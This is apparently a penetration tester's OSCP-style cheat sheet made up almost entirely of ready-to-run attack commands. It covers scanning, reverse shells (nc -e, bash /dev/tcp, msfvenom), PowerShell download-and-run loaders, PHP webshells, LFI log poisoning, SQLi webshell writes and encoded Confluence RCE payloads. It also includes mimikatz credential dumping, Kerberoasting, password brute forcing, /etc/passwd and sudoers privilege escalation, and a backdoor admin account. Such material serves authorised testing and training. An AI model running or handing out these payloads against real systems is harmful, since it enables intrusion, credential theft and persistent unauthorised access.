# Initial portscanning and web enum

Group hosts on file and scan for the web apps
```
nmap -iL hosts --open -v -sV -p 80,443,8080,8000,5000 -oA initial-web -Pn -n
```

Group hosts on file and scan for the most common ports
```
nmap -iL hosts --open -v -sV -oA initial-1k -Pn -n -r 
```

Scan the most common ports:
```
nmap --open -vv host  -p 21,22,23,25,79,80,88,110,111,113,135,137,138,139,143,161,162,264,334,389,443,445,512,513,514,548,554,593,623,636,873,992,1022,1090,1098,1099,1311,1433,1521,1522-1529,1540,1541,1560,1801,2022,2049,2121,2222,2301,2375,2376,2381,3050,3128,3260,3299,3306,3389,4321,4444,4445,4786,4848,4990,5000,5985,5060,5432,5433,5555,5556,5800,5900,5984,5985,6000,6066,6129,6379,7000-7004,7070,7071,8000-8003,8006,8008,8009,8080,8081,8088,8090,8180,8181,8383,8400,8443,8500,8554,8686,8800,8880,8888,8983,9000,9001,9002,9003,9012,9100,9160,9200,9300,9443,9503,10000,10050,10051,10255,10999,11099,11111,11211,16379,26379,27017,27018,27019,28017,44818,45000,45001,47001,47002,50500 -oA host
```

dont forget to scan udp ports
```
sudo nmap -iL hosts --open -v -sU -p161 -oA udp
```

``` 
sudo nmap -iL hosts --open -v -sU -p69 -oA udp #tftp
```

dont forget about winrm ports
```
nmap -iL hosts --open -v -p5985 -oA winrm
```

`gobuster dir -u "http://192.168.153.149" -w /usr/share/dirb/wordlists/common.txt -b 404,403`

httpx/aquaton?

## Windows

Scan a single port
```
Test-NetConnection -Port 445 172.16.124.102
```

Scan multiple portsha
``` powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("172.16.124.102", $_)) "TCP port $_ is open"} 2>$null
```

## Linux

```
netcat -v -z -n -w 1 192.168.45.230 1-1023
```


# Reverse Shell

## Linux

``` upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Windows

Do Pth and execute powershell command to download and run reverse shell:
```
iex(new-object net.webclient).downloadstring('http://192.168.45.230:8000/shell.ps1');shell
```

Generate a exe payload using msfvenom:
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.179 LPORT=4444 -f exe -o meterpreter.exe
```

# NC


```
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```
``
```
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.206 4446
```
## PHP
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

# File Exchange

## Linux

Host smb server with credentials
```
 sudo smbserver.py share . -smb2support -username user -password P@ssw0rd
```

Mount a smb share
```
mount -t cifs -o "username=michelle,password=NotMyPassword0k?" //172.16.120.21/apps /mnt/
```

Host webdav server
```
wsgidav --host=0.0.0.0  --port=8080 --auth=anonymous --root .
```

## Windows

download a file using iwr
```
certutil.exe -urlcache -f http://192.168.45.230:8000/winPEASx64.exe winPEASx64.exe

iwr -uri http://192.168.45.179:8000/chisel.exe -Outfile chisel.exe

iwr -uri http://192.168.49.103:8000/mimikatz.exe -Outfile mimikatz.exe

iwr -uri http://192.168.49.103:8000/agent.exe -Outfile agent.exe

iwr -uri http://192.168.49.103:8000/winPEASx64.exe -Outfile winPEASx64.exe

iwr -uri http://192.168.45.241:8000/PowerView.ps1 -Outfile PowerView.ps1

iwr -uri http://192.168.45.246:8000/PowerUp.ps1 -Outfile PowerUp.ps1

iwr -uri http://192.168.49.124:8000/winPEAS.bat -outfile winPEAS.bat

iwr -uri http://192.168.49.103:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

iwr -uri http://192.168.49.103:8000/GodPotato.exe -Outfile GodPotato.exe

iwr -uri http://192.168.49.103:8000/nc.exe -Outfile nc.exe

iwr -uri http://192.168.45.241:8000/reverse.exe -Outfile reverse.exe


iwr -uri http://192.168.45.241:8000/SharpHound.ps1 -Outfile SharpHound.ps1

iwr -uri http://192.168.49.124:8000/SharpHound.exe -Outfile SharpHound.exe

iwr -uri http://192.168.45.172:8000/Procmon.exe -Outfile Procmon.exe

iwr -uri http://192.168.45.241:8000/WSuspicious.exe -Outfile WSuspicious.exe
```


Connect to smb share using password
```
net use H: "\\192.168.49.103\share" P@ssw0rd /user:user
```

# OS Enumeration  and LPE


## Freebsd

open ports
```
netstat -an -p tcp
sockstat -P tcp
```

Installed software
```
pkg info
```

Check groups
```
cat /etc/group
```

Show services
```
service -l
```

Check doas.conf
```
cat /usr/local/etc/doas.conf
```

## Windows 

Find uncommon services
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName |findstr -i -V "system32"
```

```
wmic service get name,pathname |findstr -i -V "system32" | findstr -V "^$" 
```

```
schtasks /query /fo LIST /v  |findstr -i "Run:" | findstr -v "COM handler" | findstr -i -v system32
```

General System info:
```
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process | ForEach-Object {$_.Path} 
Get-History
(Get-PSReadlineOption).HistorySavePath

```

```
net user /domain

$env.AppKey
cmdkey /list
ipconfig
netstat -ano -p tcp
whoami /all
Get-ChildItem *.txt *.zip -recurse -ErrorAction SilentlyContinue -Force
Get-ChildItem C:\Users\offsec\AppData *.txt -recurse -ErrorAction SilentlyContinue -Force

Get-Process
 .\winPEASx64.exe log
 .\winPEAS.bat log
```

show kerberos tickets
`klist`

Check putty session
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

CheckPowershell History
```
Get-ChildItem "ConsoleHost_history.txt" -recurse -ErrorAction SilentlyContinue -Force
(Get-PSReadlineOption).HistorySavePath
```

Download and run PowerUP
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.230:8000/PowerUp.ps1'); PowerUp
```

Download and run Powerview
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.230:8000/PowerView.ps1'); PowerView
```

```
schtasks /query /fo LIST /v
```

Start a service
```
powershell -c "Start-Service -Name AuditTracker"
```

Get a list of Scheduled tasks
```
Get-ScheduledTask
```

Get a list of services
```
Get-Service
```

Restart a service 
```
restart-service schedule
```
Start a service
```
start-service
```

Monitor a difference in output
```
# https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
Get-Service | Watch-Command -Diff -Cont
```

PrintSpoofer reverse shell
```
.\PrintSpoofer64.exe -c "c:\Temp\nc.exe 192.168.45.246 8001 -e cmd"
.\PrintSpoofer64.exe -c "reverse.exe"
```

GodPotato Reverse shell
```
.\GodPotato.exe -cmd "nc.exe -e cmd.exe 192.168.45.230 4444"

.\Godpotato.exe -cmd "reverse.exe"
```

### PowerUp

```
powershell -ep bypass
powershell -c "Import-Module .\PowerUp.ps1"
Get-ModifiableServiceFile
Get-UnquotedService
```

## Linux

check running processes
```
ps aux
```

Read all the cronjobs

```
cat /etc/cron*
```

check cron logs
```
grep "CRON" /var/log/syslog
```

Find SUID binaries
```
find / -perm -u=s -type f 2>/dev/null
```

find files with read as user access
```
find / -user stuart  2>/dev/null  | grep -v -e proc -e systemd -e cgroup
```

find writable 
```
find / -writable -type d 2>/dev/null
```

Find binaries with capabilities
```
/usr/sbin/getcap -r / 2>/dev/null
```

Download PwnKit 
```
wget 192.168.49.103:8000/PwnKit
```

Download and execute linpeas 
```
curl 192.168.49.103:8000/linpeas.sh | sh | tee result
```

Check groups
```
cat /etc/group
```

iptables rules
```
cat /etc/iptables/rules.v4
```

writable pass file
```
ls -lah /etc/passwd
openssl passwd w00t -> Fdzt.eqJQ4s0g
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```

LPE tar wildcard expansion
```
echo "echo 'cassie ALL=(root) NOPASSWD: ALL' >> /etc/sudoers" > privesc.sh
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
```


# Pivoting

## Chisel
Run as client (attacker)
```
./chisel client 192.168.249.121:8080 socks
```

run as server (compromised host)
```
.\chisel.exe server --socks5
```

## Ligolo (better)

```
Run proxy as a server (attacker)

# Setup routes
sudo ip route add 192.168.0.0/24 dev ligolo

# Optional (make sure interface exist and activate it)
sudo ip tuntap add user username mode tun ligolo
sudo ip link set ligolo up

ligolo-proxy -selfcert

```

run agent as a client (compromised host)
```
.\agent.exe -connect 192.168.49.103:11601 -ignore-cert
```

## Socat

Forward local port 2345 to 10.4.50.215:5432
```
socat -ddd TCP-LISTEN:2222,fork TCP:10.4.196.215:22
```

## SSH 

Remote port forwarding (from compomised host to attacker machine to get to the deeper network on single host+port)
```
ssh -N -R 0.0.0.0:4444:10.4.218.215:4444 oscp@192.168.45.206
```

Remote dynamic port forward (from compomised host to attacker machine to get to the deeper network dynamicly)
```
ssh -N -R 9998 oscp@192.168.45.206
```

## Plink

```
C:\Windows\Temp\plink.exe -ssh -l oscp -pw oscp -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.206
```


# Active Directory

## Enumeration 

Download and run Sharphound
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.124:8000/SharpHound.ps1'); Invoke-BloodHound -c All -s
```

Run rusthound from linux box
``` bash
proxychains ./rusthound -i 172.16.184.10 -u joe -p Flowers1  --domain medtech.com
```

## Kerberos

Kerberoasting
```
netexec ldap  10.10.207.140 -u celia.almeda -p "7k8XHk3dMtmpnC7" --kerberoasting KERBEROASTING
```

```
Rubeus.exe kerberoast /outfile:hashes.txt
```

ASREProasting
```
netexec ldap  10.10.207.140 -u celia.almeda -p "7k8XHk3dMtmpnC7"  --asreproast ASREPROAST
```

# Generic Windows

Connect to compromised host via winrm
```
 evil-winrm -i 192.168.224.121 -u administrator -H "b2c03054c306ac8fc5f9d188710b0168"
```


Connect to compromised host via rdp
```
xfreerdp /v:172.16.234.12:3389 /u:yoshi /p:"Mushroom\!" /cert-ignore /d:medtech.com /compression /drive:shared,/home/username/EDUCATION/OSCP/
```

Command execution via psexec
```
psexec.py medtech.com/leon:"rabbit:)"@172.16.234.10
```

# Post Exploitation 

## Windows Persistance

```
net user /add curiv P@ssw0rd
net localgroup administrators curiv /add
```

## Windows 

```
.\mimikatz.exe "token::elevate" "log lsadump::lsa /inject" exit
.\mimikatz.exe "token::elevate" "lsadump::secrets" exit
.\mimikatz.exe "token::elevate" "lsadump::sam" exit
.\mimikatz.exe "lsadump::sam /system:C:\windows.old\Windows\System32\SYSTEM /sam:C:\windows.old\Windows\System32\SAM" exit 
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"


```

# Password attacks

## Bruteforce

ssh
```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

rdp 

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

http-post
```
hydra -l user -P ~/wordlists/PASSWORDS/rockyou.txt 192.168.196.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

http-basic
```
hydra -l admin -P ~/wordlists/PASSWORDS/rockyou.txt -s 80 -f 192.168.196.201 http-get
```

# Databases

## MSSQL

connect and execute querries
```
netexec mssql 192.168.242.248 -u emma -p "SomersetVinyl1\!" --port 49965 -q "select @@version;
```

Enable command execution
1. connect to host `impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
2. `EXECUTE sp_configure 'show advanced options', 1;`
3. `RECONFIGURE;`
4. `EXECUTE sp_configure 'xp_cmdshell', 1;`
5. `RECONFIGURE;`

FIleupload and reverse shell after
```
netexec mssql 10.10.113.148 -u sql_svc -p "Dolphin1" --put-file nc.exe C:\Windows\Temp\nc.exe
```

```
netexec mssql 10.10.113.148 -u sql_svc -p "Dolphin1" -x "C:\Windows\Temp\nc.exe 10.10.113.147 4444 -e cmd.exe"
```

## Mongo

connect to mongo db
```
mongosh 172.16.203.30
```

## MySQL

```

```


# SNMP

Bruteforce SNMP community
```
sudo onesixtyone 192.168.165.145
```

SNMP base enum nmap
`sudo nmap 192.168.213.156 -sU -p161 --script="snmp*" -v`

SNMP User Enumeration
`sudo nmap 192.168.165.145 -sU -p161 --script=snmp-win32-users`

netstat enum
` sudo nmap 192.168.165.145 -sU -p161 --script=snmp-netstat`

general dump
```
snmpbulkwalk -c public -v2c 192.168.213.156
```

software enum
```
snmpwalk -c public -v1 192.168.153.149 1.3.6.1.2.1.25.6.3.1.2
```

open ports
``` 
snmpwalk -c security 192.168.103.110 1.3.6.1.2.1.6.13.1.3 -v2c
```

extended output
```
snmpwalk -c security 192.168.103.110 NET-SNMP-EXTEND-MIB:nsExtendOutputFill -v2c
```

# WEB

## File Upload

Inject responder UNC in a filename header of multipart HTTP POST request
```
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.206\\test"
```

## Confluence RCE

```
curl http://192.168.218.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/
192.168.45.206/4444%200%3E%261%27%29.start%28%29%22%29%7D/ -v
```
## Apache RCE

Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)

https://www.exploit-db.com/exploits/50383

## LFI Log poisoning

Poison a log by injecting UserAgent (linux)
```
GET /meteor/index.php?page=../../../../../../../var/log/apache2/access.log HTTP/1.1
Host: 192.168.196.16
User-Agent: pentest <?php echo system($_GET['cmd']); ?>
Accept: */*
```

Poison a log by injecting UserAgent (windows)
```
GET /meteor/index.php?page=../../../../../../xampp\apache\logs\access.log HTTP/1.1
Host: 192.168.196.193
User-Agent: pentest <?php echo system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```

Execute commands providing cmd get parameter (adjust log path accoding to your IOS)

```
GET /meteor/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
Host: 192.168.196.16
User-Agent: pentest <?php echo system($_GET['cmd']); ?>
Accept: */*
Connection: keep-alive
```



Send a reverse shell (encoded payload `bash -c "bash -i >& /dev/tcp/192.168.45.241/8001 0>&1"`)
```
GET /meteor/index.php?page=../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.241%2F8001%200%3E%261%22 HTTP/1.1
Host: 192.168.196.16
User-Agent: pentest <?php echo system($_GET['cmd']); ?>
Accept: */*
Connection: keep-alive
```


## LFI PHP wrappers

Base64 encode php code via `php://filter` wrapper and output as a text

```
http://192.168.196.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```

Command execution via `data://` wrapper
```
curl "http://192.168.196.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

Command execution with `system` bypass via base64 encoding
```
curl "http://192.168.196.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

## RFI

simple-backdoor.php
```php 
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

Include php file and provide a command to execute
```
curl "http://192.168.196.16/meteor/index.php?page=http://192.168.45.241/simple-backdoor.php&cmd=ls"
```


## RCE

Linux based using `nc -c` payload
`Archive=2ip.ru%3Bnc%20-c%20bash%20192.168.45.241%2080`

## SQLi

Authentication bypass

````
offsec' OR 1=1 -- //
````

Time-based blind
```
 offsec' AND IF (1=1, sleep(3),'false') -- //
```

WebShell (identify the number of columns before)

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null INTO OUTFILE "/var/www/html/tmp/webshell1.php" -- //
```

Error-based SQLi
```
' or 1=1 in (select @@version) -- //
```

PSQL RCE
```
weight=1&height=1'; CREATE TABLE shell(output text); -- //&age=1&gender=Male&email=test%40test.com
```


## Confluence RCE 

download chisel
```
curl http://192.168.196.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilde
r%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.241/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D
```

connect to server
```
curl http://192.168.196.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilde
r%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.241:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

reverse shell
```
curl http://192.168.196.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.241/443%200%3E%261%27%29.start%28%29%22%29%7D/
```